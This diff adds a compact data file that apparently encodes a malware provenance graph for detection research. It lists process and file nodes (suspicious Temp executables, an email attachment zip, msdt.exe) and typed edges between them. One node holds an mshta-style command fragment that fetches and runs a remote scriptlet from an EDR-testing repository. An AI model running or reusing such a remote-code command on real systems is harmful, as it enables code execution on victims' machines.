@@ -1,0 +1,29 @@
+11
+MP*-DataSvcUtil.exe
+SO-https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct").Exec();close
+MP*-Nixware.exe
+MP*-msdt.exe
+MP-wbengine.exe
+TF-\Users\admin\AppData\Local\Temp\c3c6a5675d32fe330b83debceb63d60e.exe
+MP-nsA042.tmp
+SF-C:\Users\admin\AppData\Local\Temp\bfsvc.exe
+MF-C:\Users
+SF-C:\Users\admin\Desktop\Attachment_94259849.zip
+MP*-winhlp32.exe
+15
+1 0 RF
+0 2 FR
+2 1 ST
+0 3 FR
+3 1 ST
+0 4 UK
+2 5 WR
+3 5 WR
+1 6 RF
+3 6 UK
+2 7 WR
+2 8 WR
+2 9 RD
+10 1 ST
+2 10 UK
+
